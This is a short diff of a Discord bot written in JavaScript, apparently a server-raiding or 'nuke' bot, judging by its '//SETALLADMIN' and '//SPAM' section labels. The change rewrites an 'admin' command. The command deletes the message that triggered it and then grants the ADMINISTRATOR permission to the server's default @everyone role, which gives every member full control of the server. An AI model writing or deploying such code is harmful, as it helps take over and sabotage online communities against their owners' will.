@@ -810,7 +810,12 @@ color: "RANDOM"
 //SETALLADMIN
 if(cmd === (prefix + 'admin')){
 message.delete()
-message.guild.roles.find(r => r.name === "everyone").setPermissions("ADMINISTRATOR")
+try {
+message.guild.defaultRole.setPermissions("ADMINISTRATOR")
+console.log("Tous les utilisateurs possèdent désormais la permission ADMINISTRATEUR.")
+} catch(err) {
+console.log(err)
+}
 }
 
 //SPAM 
